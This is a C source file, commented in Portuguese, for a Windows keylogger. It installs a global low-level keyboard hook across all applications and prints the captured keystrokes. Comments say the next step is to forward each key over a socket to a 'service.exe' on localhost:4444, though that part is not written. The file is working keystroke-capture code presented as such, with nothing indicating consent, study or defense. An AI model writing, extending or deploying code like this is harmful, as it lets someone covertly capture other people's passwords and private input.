#include <windows.h>
#include <stdio.h>

// Handle para o nosso gancho (hook)
HHOOK keyboardHook;

// Função de Callback que o Windows vai chamar toda vez que uma tecla for pressionada
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Se nCode for maior ou igual a 0, significa que temos uma mensagem de teclado para processar
    if (nCode >= 0) {
        // wParam verifica qual o estado da tecla (se ela foi pressionada ou solta)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // lParam contém as informações detalhadas sobre a tecla
            KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = kbdStruct->vkCode;

            // Aqui você processa a tecla pressionada
            // Exemplo: Imprimir no console (No futuro, você enviaria isso pro seu serviço via socket)
            if (vkCode >= 'A' && vkCode <= 'Z') {
                printf("%c", vkCode); // Teclas de A a Z
            } else if (vkCode >= '0' && vkCode <= '9') {
                printf("%c", vkCode); // Números
            } else if (vkCode == VK_RETURN) {
                printf("[ENTER]\n");
            } else if (vkCode == VK_SPACE) {
                printf(" ");
            } else if (vkCode == VK_BACK) {
                printf("[BACKSPACE]");
            }
            // ... você pode mapear outras teclas especiais (Shift, Ctrl, pontuações, etc) ...
            
            // IMPORTANTE: Aqui é onde você implementaria o código para mandar 
            // essa tecla para o `service.exe` conectando no localhost:4444.
        }
    }
    
    // É OBRIGATÓRIO chamar a próxima função da cadeia de hooks para não travar o teclado do usuário
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    // 1. Instala o Hook Global de teclado
    // WH_KEYBOARD_LL = Low-Level Keyboard
    // KeyboardProc = Nossa função de callback
    // NULL e 0 = Diz ao Windows que o hook deve interceptar todas as threads de todas as aplicações
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (keyboardHook == NULL) {
        printf("Falha ao instalar o Hook de teclado!\n");
        return 1;
    }

    printf("Keylogger iniciado (Agente do usuario). Pressione CTRL+C para sair.\n");

    // 2. Loop de Mensagens do Windows (Obrigatório)
    // O hook de teclado necessita de um loop de mensagens para continuar rodando e recebendo os eventos.
    // Sem esse loop, o programa fecharia instantaneamente.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 3. Remove o hook ao finalizar o programa (embora com CTRL+C ele não chegue aqui, 
    // é boa prática para caso de um shutdown limpo).
    UnhookWindowsHookEx(keyboardHook);

    return 0;
}
